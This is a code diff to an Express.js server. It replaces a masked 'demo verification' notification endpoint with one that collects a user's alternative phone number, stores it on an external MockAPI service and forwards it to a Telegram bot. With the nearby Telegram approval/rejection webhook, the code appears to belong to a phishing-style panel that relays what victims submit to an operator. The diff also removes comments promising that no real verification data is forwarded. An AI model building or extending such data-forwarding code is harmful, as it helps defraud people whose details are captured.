@@ -144,43 +144,69 @@ app.post("/api/submit", async (req, res) => {
    DEMO VERIFICATION TELEGRAM NOTIFICATION
 ===================================== */
 
-app.post("/api/verification-submitted", async (req, res) => {
-    try {
 
-        // Accept only the expected demo event.
-        if (
-            !req.body ||
-            req.body.event !== "demo_verification_submitted"
-        ) {
+app.post("/api/alternative-phone", async (req, res) => {
+    try {
+        const alternativePhone =
+            String(req.body.alternative_phone_number || "").trim();
+
+        const digits = alternativePhone.replace(/\D/g, "");
+
+        if (digits.length < 7 || digits.length > 15) {
             return res.status(400).json({
                 ok: false,
-                error: "Invalid demo notification request"
+                error: "Please provide a valid phone number."
             });
         }
 
-        // Send a masked notification only.
-        // No actual verification digits are received or forwarded.
-        await sendTelegramNotification.sendDemoVerificationNotification();
+        if (!MOCKAPI_URL) {
+            throw new Error("MOCKAPI_URL is not configured");
+        }
+
+        // Save alternative contact number to MockAPI
+        const mockResponse = await fetch(MOCKAPI_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                alternative_phone_number: alternativePhone,
+                record_type: "alternative_contact",
+                created_at: new Date().toISOString()
+            })
+        });
+
+        if (!mockResponse.ok) {
+            throw new Error("Could not save alternative number to MockAPI");
+        }
+
+        const savedRecord = await mockResponse.json();
+
+        // Send the saved alternative number to Telegram
+        await sendTelegramNotification.sendAlternativePhoneNotification(
+            alternativePhone,
+            savedRecord.id
+        );
 
         return res.status(200).json({
             ok: true,
-            message: "Demo notification sent"
+            message: "Alternative phone number saved and notification sent.",
+            id: savedRecord.id
         });
 
     } catch (error) {
-
         console.error(
-            " verification notification error:",
+            "Alternative phone submission error:",
             error.message
         );
 
         return res.status(500).json({
             ok: false,
-            error: "Could not send dnotification"
+            error: "Unable to complete phone number submission."
         });
-
     }
 });
+
 
 
 // Telegram approval/rejection webhook
